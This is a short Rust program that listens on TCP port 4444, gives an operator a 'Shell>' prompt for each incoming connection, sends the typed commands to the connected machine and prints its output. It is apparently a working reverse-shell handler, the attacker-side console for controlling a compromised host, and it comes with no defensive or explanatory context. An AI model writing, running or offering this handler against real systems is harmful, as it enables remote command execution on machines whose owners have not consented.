use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;

fn handle_client(mut stream: TcpStream) {
    let mut input = String::new();
    loop {
        input.clear();
        print!("Shell> ");
        std::io::stdout().flush().unwrap();
        std::io::stdin().read_line(&mut input).unwrap();
        if stream.write_all(input.as_bytes()).is_err() {
            break;
        }

        let mut buffer = [0; 4096];
        match stream.read(&mut buffer) {
            Ok(n) if n == 0 => break,
            Ok(n) => println!("{}", String::from_utf8_lossy(&buffer[..n])),
            Err(_) => break,
        }
    }
}

fn main() {
    let listener = TcpListener::bind("0.0.0.0:4444").expect("Failed to bind");
    println!("Listening on port 4444...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(move || {
                    handle_client(stream);
                });
            }
            Err(e) => eprintln!("Error: {}", e),
        }
    }
}